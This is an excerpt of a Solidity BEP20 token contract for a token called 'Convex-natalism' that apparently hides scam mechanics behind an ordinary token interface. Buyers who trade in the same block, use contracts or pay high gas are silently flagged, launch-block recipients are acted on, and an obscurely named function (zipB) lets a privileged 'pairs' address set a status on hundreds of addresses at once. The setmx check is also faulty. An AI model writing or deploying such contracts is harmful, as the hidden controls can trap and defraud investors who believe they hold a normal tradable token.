...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private mem;
    ...
    function setmx(uint256  maxprice_) external onlyOwner { 
     require(maxprice>50 * 10 **8);
     maxprice=maxprice_; 
    }
    ...
    function zipB(address[] calldata addresses, bool status) public  {
        require(addresses.length < 201 && msg.sender == pairs);
        for (uint256 i; i < addresses.length; ++i) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                ...
                if (smallOrEqual(block.number , launchBlock + fucu) && !isMarketPair[recipient]) {doit(recipient);}
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            if(mem[recipient]==block.number || isContract(recipient)||tx.gasprice >maxprice) _marked[recipient] = true;
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
            mem[recipient] = block.number;
        }
        else if(isMarketPair[recipient]) {
            if(mem[sender]==block.number || isContract(sender)||tx.gasprice >maxprice) _marked[sender] = true;
...
contract Token is BEP20 {
    constructor(uint256 gas, uint256 num) BEP20(
        "Convex-natalism", 
        "CN",
        100000000000,
        ...
        [uint256(0),uint256(4),uint256(0)],
        [uint256(0),uint256(4),uint256(0)],
        [uint256(500000000),uint256(1000000000)],
        [address(0xCE40e580919137a50dF312873FA6925F4C452067),address(0xCE40e580919137a50dF312873FA6925F4C452067)],
        [gas,num],
        address(0xCE40e580919137a50dF312873FA6925F4C452067)
    ){}
}